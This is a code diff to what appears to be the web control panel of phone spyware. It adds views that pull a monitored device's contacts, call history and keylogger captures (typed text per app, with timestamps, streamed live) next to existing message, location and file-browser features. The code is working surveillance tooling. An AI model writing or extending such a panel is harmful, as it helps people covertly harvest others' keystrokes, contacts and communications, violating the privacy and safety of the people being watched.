@@ -691,6 +691,18 @@ function handleJsonMessage(data) {
             }
             break;
 
+        case 'CONTACTS':
+            if (data.deviceId === currentDeviceId) contactsRender(data.contacts || []);
+            break;
+
+        case 'CALL_LOG':
+            if (data.deviceId === currentDeviceId) calllogsRender(data.calls || []);
+            break;
+
+        case 'KEYLOG_EVENT':
+            if (data.deviceId === currentDeviceId) keylogAppend(data);
+            break;
+
         case 'FILE_LIST':
             if (data.deviceId === currentDeviceId) fbRenderList(data);
             break;
@@ -1223,6 +1235,15 @@ function fetchDeviceHistory(deviceId) {
 
     // 3. Fetch Messages History
     waReloadMessages(deviceId);
+
+    // 4. Fetch Contacts
+    fetchContacts(deviceId);
+
+    // 5. Fetch Call Logs
+    fetchCallLogs(deviceId);
+
+    // 6. Fetch Keylog
+    fetchKeylog(deviceId);
 }
 
 // Fetch and draw trail for selected days
@@ -2743,3 +2764,176 @@ document.addEventListener('fullscreenchange', () => {
     }
 });
 
+
+// ═══════════════════════════════════════════════════════════════════════════
+// CONTACTS
+// ═══════════════════════════════════════════════════════════════════════════
+let _allContacts = [];
+
+function fetchContacts(deviceId) {
+    const id = deviceId || currentDeviceId;
+    if (!id) return;
+    fetch(`/api/device/${id}/contacts`, { headers: authHeaders() })
+        .then(r => r.json())
+        .then(rows => { if (id === currentDeviceId) contactsRender(rows); })
+        .catch(e => console.error('fetchContacts:', e));
+}
+
+function contactsRender(rows) {
+    _allContacts = rows;
+    contactsApplyFilter(document.getElementById('contacts-search')?.value || '');
+}
+
+function contactsFilter(q) { contactsApplyFilter(q); }
+
+function contactsApplyFilter(q) {
+    const list  = document.getElementById('contacts-list');
+    const empty = document.getElementById('contacts-empty');
+    if (!list) return;
+    const lq = (q || '').toLowerCase();
+    const data = lq ? _allContacts.filter(c =>
+        c.name.toLowerCase().includes(lq) || c.phone.toLowerCase().includes(lq)
+    ) : _allContacts;
+
+    if (data.length === 0) {
+        list.style.display = 'none';
+        empty.style.display = '';
+        empty.innerHTML = `<i class="fa-solid fa-address-book fa-2x"></i><p>${_allContacts.length === 0 ? 'Selecione um dispositivo e clique em Sync' : 'Nenhum contato encontrado'}</p>`;
+        return;
+    }
+    list.style.display = '';
+    empty.style.display = 'none';
+    list.innerHTML = data.map(c => {
+        const initials = (c.name || '?').split(' ').slice(0,2).map(w => w[0]).join('').toUpperCase();
+        const color = contactAvatarColor(c.name);
+        return `<li class="contact-item">
+            <div class="contact-avatar" style="background:${color}">${escapeHtml(initials)}</div>
+            <div class="contact-info">
+                <span class="contact-name">${escapeHtml(c.name || '—')}</span>
+                <span class="contact-phone">${escapeHtml(c.phone)}</span>
+            </div>
+        </li>`;
+    }).join('');
+}
+
+function contactAvatarColor(name) {
+    const colors = ['#4f8ef7','#25d366','#e1306c','#f7b731','#a29bfe','#fd79a8','#00b894','#6c5ce7'];
+    let h = 0;
+    for (let i = 0; i < (name||'').length; i++) h = ((h << 5) - h) + name.charCodeAt(i);
+    return colors[Math.abs(h) % colors.length];
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// CALL LOGS
+// ═══════════════════════════════════════════════════════════════════════════
+function fetchCallLogs(deviceId) {
+    const id = deviceId || currentDeviceId;
+    if (!id) return;
+    fetch(`/api/device/${id}/call-logs`, { headers: authHeaders() })
+        .then(r => r.json())
+        .then(rows => { if (id === currentDeviceId) calllogsRender(rows); })
+        .catch(e => console.error('fetchCallLogs:', e));
+}
+
+function calllogsRender(rows) {
+    const list  = document.getElementById('calllogs-list');
+    const empty = document.getElementById('calllogs-empty');
+    if (!list) return;
+    if (!rows || rows.length === 0) {
+        list.style.display = 'none';
+        empty.style.display = '';
+        return;
+    }
+    list.style.display = '';
+    empty.style.display = 'none';
+    list.innerHTML = rows.map(c => {
+        const typeIcon = {
+            incoming: '<i class="fa-solid fa-phone-arrow-down-left cl-incoming"></i>',
+            outgoing: '<i class="fa-solid fa-phone-arrow-up-right cl-outgoing"></i>',
+            missed:   '<i class="fa-solid fa-phone-missed cl-missed"></i>',
+            rejected: '<i class="fa-solid fa-phone-slash cl-missed"></i>',
+        }[c.type] || '<i class="fa-solid fa-phone cl-incoming"></i>';
+        const dur = c.duration > 0 ? fmtDuration(c.duration) : '—';
+        const date = new Date(c.timestamp).toLocaleString('pt-BR');
+        return `<li class="cl-item">
+            <span class="cl-icon">${typeIcon}</span>
+            <div class="cl-info">
+                <span class="cl-name">${escapeHtml(c.name || c.number)}</span>
+                <span class="cl-sub">${escapeHtml(c.number)} · ${date}</span>
+            </div>
+            <span class="cl-dur">${dur}</span>
+        </li>`;
+    }).join('');
+}
+
+function fmtDuration(secs) {
+    if (!secs) return '0s';
+    const m = Math.floor(secs / 60), s = secs % 60;
+    return m > 0 ? `${m}m ${s}s` : `${s}s`;
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// KEYLOG
+// ═══════════════════════════════════════════════════════════════════════════
+let _allKeylog = [];
+
+function fetchKeylog(deviceId) {
+    const id = deviceId || currentDeviceId;
+    if (!id) return;
+    fetch(`/api/device/${id}/keylog`, { headers: authHeaders() })
+        .then(r => r.json())
+        .then(rows => {
+            if (id !== currentDeviceId) return;
+            _allKeylog = rows;
+            keylogApplyFilter(document.getElementById('keylog-search')?.value || '');
+        })
+        .catch(e => console.error('fetchKeylog:', e));
+}
+
+function keylogAppend(data) {
+    _allKeylog.unshift({
+        app: data.app, appLabel: data.appLabel,
+        text: data.text, timestamp: data.timestamp
+    });
+    if (_allKeylog.length > 1000) _allKeylog.pop();
+    keylogApplyFilter(document.getElementById('keylog-search')?.value || '');
+}
+
+function keylogFilter(q) { keylogApplyFilter(q); }
+
+function keylogApplyFilter(q) {
+    const list  = document.getElementById('keylog-list');
+    const empty = document.getElementById('keylog-empty');
+    if (!list) return;
+    const lq = (q || '').toLowerCase();
+    const data = lq ? _allKeylog.filter(k =>
+        (k.appLabel || k.app || '').toLowerCase().includes(lq) ||
+        (k.text || '').toLowerCase().includes(lq)
+    ) : _allKeylog;
+
+    if (data.length === 0) {
+        list.style.display = 'none';
+        empty.style.display = '';
+        return;
+    }
+    list.style.display = '';
+    empty.style.display = 'none';
+    list.innerHTML = data.map(k => {
+        const date = new Date(k.timestamp).toLocaleString('pt-BR');
+        const label = escapeHtml(k.appLabel || k.app || 'Desconhecido');
+        return `<li class="kl-item">
+            <div class="kl-header">
+                <span class="kl-app">${label}</span>
+                <span class="kl-time">${date}</span>
+            </div>
+            <span class="kl-text">${escapeHtml(k.text)}</span>
+        </li>`;
+    }).join('');
+}
+
+function clearKeylogPanel() {
+    _allKeylog = [];
+    keylogApplyFilter('');
+    const input = document.getElementById('keylog-search');
+    if (input) input.value = '';
+}
